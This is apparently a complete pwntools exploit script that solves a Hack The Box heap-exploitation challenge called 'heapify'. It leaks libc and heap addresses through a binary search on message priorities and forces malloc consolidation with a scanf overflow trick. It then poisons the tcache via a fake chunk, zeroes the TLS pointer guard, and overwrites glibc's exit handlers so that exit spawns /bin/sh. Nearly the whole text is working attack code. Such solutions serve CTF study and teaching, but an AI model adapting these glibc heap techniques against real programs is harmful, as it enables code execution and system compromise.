#!/usr/bin/python3

# THIS SOLUTION WAS PROVIDED BY THE AUTHOR `ash_999`
# https://github.com/sasha-999

from pwn import *
from sys import argv

e = context.binary = ELF('heapify')
libc = ELF("libc.so.6", checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

def send_num(prompt, n):
    data = b"." if n is None else str(n).encode()+b"\n"
    p.sendafter(prompt, data)

send_choice = lambda c: send_num(b"> ", c)

parent = lambda i: (i-1)>>1
lchild = lambda i: (i<<1)+1
rchild = lambda i: (i<<1)+2

def rol(x, s, bits=64):
    return ((x << s) | (x >> (bits-s))) % (1<<bits)

def protect_ptr(p, addr):
    return p ^ (addr >> 12)

def send(priority, size, data=b""):
    assert b"\n" not in data
    send_choice(1)
    send_num(b"Enter size of command: ", size)
    send_num(b"Enter priority: ", priority)
    p.sendlineafter(b"Enter command: ", data)

def free():
    send_choice(2)

# only used if we care about the output
def recv():
    free()
    p.recvuntil(b"Executing command...\n")
    out = p.recvline()
    if b"HTB{fo0L_m3_0nc3_sh4m3_0n_y0U}" in out:
        return b"flag"
    if b"HTB{fo0L_m3_tw1c3_sh4m3_0n_mE}" in out:
        return b"realflag"
    return None

# scanf trick to trigger malloc(0x800)
def malloc_consolidate():
    # create size that when trunctated to 64-bit becomes 0
    # and is longer than 1024 nytes (including extra null byte)
    size = 10**1024
    size += (0-size) % (1<<64)
    send_choice(1)
    send_num(b"Enter size of command: ", size)

p = conn()

# freed after tcache
# but before the fastbins
send(7, 0x40)
send(7, 0x30)
send(-1, 0x10, b"pad")

for i in range(7):
    # sent to fastbin, 8-14
    send(i+7+1, 0x40)
    send(i+7+1, 0x30)
    # sent to tcache, 0-6
    send(i, 0x40)
    send(i, 0x30)

# free everything except "pad"
for _ in range(30):
    free()

# trigger malloc_consoliate()
# to consolidate adjacent fastbin[0x40], fastbin[0x50] to smallbin[0x90]
malloc_consolidate()

# allocate back most of the smallbin[0x90] with 0x80 chunks
for _ in range(7):
    send(0, 0x70)

# free them to fill tcache[0x90]
for _ in range(7):
    free()

# tcache[0x90] is full, so freed 0x90 chunks go to unsorted bin
# and we have a 0x90 chunk in the smallbin
# which we can allocate back with a 0x80 chunk
# 0x80 doesn't have any chunks in fastbin or tcache
# so it allocated back the smallbin

def bsearch(target_size, lo, hi):
    assert hi > lo
    cmd_target = b"flag"
    cmd_tmp = b"realflag"
    # allocate on chunk with the fd we want to leak
    # we ensure that we don't initialize this fd
    send(None, target_size, cmd_target)
    while lo != hi:
        # lo is picked such that:  lo <= target
        # mid is picked such that: lo <= mid < hi
        # ==> lo < hi
        # when increasing lo, or decreasing hi, the following always holds: lo <= target <= hi
        # so eventually lo == hi == target
        mid = (lo + hi) // 2
        send(mid, 0x10, cmd_tmp)
        if recv() == cmd_tmp:
            # new chunk (mid) was upheap'ed to the top
            # so mid < target
            # ==>
            # new_lo = mid+1 <= target <= hi
            lo = mid + 1    # this increases as (mid >= lo) ==> (mid+1 > lo)
            continue
        # now we know that mid >= target
        free()  # tmp

        # target was freed. realloc target chunk
        send(None, target_size, cmd_target)
        hi = mid    # this decreases as mid < hi
        # lo <= mid = new_hi
    free()  # target
    return lo

libc_leak = bsearch(0x70, 0, 1<<48)
libc.address = libc_leak - 0x219d60     # main_arena+224

log.info(f"libc leak: {hex(libc_leak)}")
log.info(f"libc: {hex(libc.address)}")

# note about offset
# while it does come from unsorted bin
# since the size doesn't match exactly
# it's first sent to smallbin[0x90]
# then returned to the user (https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4309)
# so the main_arena address refers to the smallbin[0x90], not unsortedbin

free()  # pad
# heap is now empty

# use unused tcache so that the freed tcache
# has fd = protect_ptr(NULL, addr) = 0 ^ (addr >> 12) = addr >> 12
# leaking this allows us to leak the heap base by shifting it back
send(0, 0x50, b"tcache")
free()

heap_leak = bsearch(0x50, 0, 1<<(48-12))
heap_base = heap_leak << 12
log.info(f"heap base: {hex(heap_base)}")
# heap is now empty

# creates a set of priorities that cause a sufficiently large priority
# to be downheap'ed to a certain index
# from which it can then downheap to a ptr OOB
def downheap2index(i):
    heap = []
    for h in range(5, -1, -1):
        priority = (6-h) << 4
        heap = [-priority] * (1<<h) + heap
    heap = heap[:i+1]
    while i:
        heap[i] -= 1
        i = parent(i)
    heap.append(-1)
    return heap

# increment counts of:
# * tcache[0x70] to 1
# * tcache[0x80] to 2
send(0, 0x70)
send(0, 0x70)
send(0, 0x60)

free()
free()
free()

# &tcache[0x60].ptr
target = heap_base+0xb0
addr_fake = heap_base+0x4e0

# i=67 is the index of the fake ptr
i = parent(67)
priorities = downheap2index(i)

fake  = b"\x00" * 8
# fake msg pointers (lchild | rchild)
fake += p64(addr_fake) + p64(0)
# fake chunk
fake += p64(0) + p64(0x81)
fake += p64(0)  # low priority, +0x4c0
# lowest priority, freed first
# which is helpful as we need to allocate back onto this chunk to corrupt the fake chunk
send(priorities[0], 0x50, fake)

# fill out each slot in heap
for i in priorities[1:]:
    send(i, 0x10)

# this free() first moves the last msg to the top
# since it has the largest priority, it's downheap'ed through the path we specified
# to the parent of i=67
# then it notices the lchild (67) has a smaller priority, so downheap will swap these
# so now the fake msg at i=67 is moved into the heap
# and since the path we specified goes to the last msg in the heap
# the fake msg is moved to the last msg in the heap
free()

# now we move the fake msg to the top of the heap
# since it has the lowest priority (0), it remains at the top
free()

# free the fake msg
free()

# allocate on top of fake chunk, overwriting fd in tcache[0x80]
overwrite  = p64(0) * 4
overwrite += p64(0x81)
overwrite += p64(protect_ptr(target, addr_fake))
send(0, 0x50, overwrite)

# bring arb fd to head of tcache[0x80]
send(0, 0x70)


tls = libc.address - 0x28c0
tcache70 = tls + 0x30
tcache80 = libc.address + 0x21af10  # &initial.fns[0]

# overwrite heads of tcache[0x70] and tcache[0x80]
# tcache[0x70] -> fs:[0x30]
# tcache[0x80] -> initial+0x10
# counts of each tcache is 1
send(0, 0x70, p64(tcache70) + p64(tcache80))

# overwrite fs:[0x30] = 0
send(0, 0x60, b"")

# overwrite exit_functions
exit_func  = p64(rol(libc.sym.system, 0x11))        # fn
exit_func += p64(next(libc.search(b"/bin/sh\x00"))) # arg
# flavor = ef_cxa = 4
send(4, 0x70, exit_func)

# trigger exit(1)
send_choice(0)
p.interactive()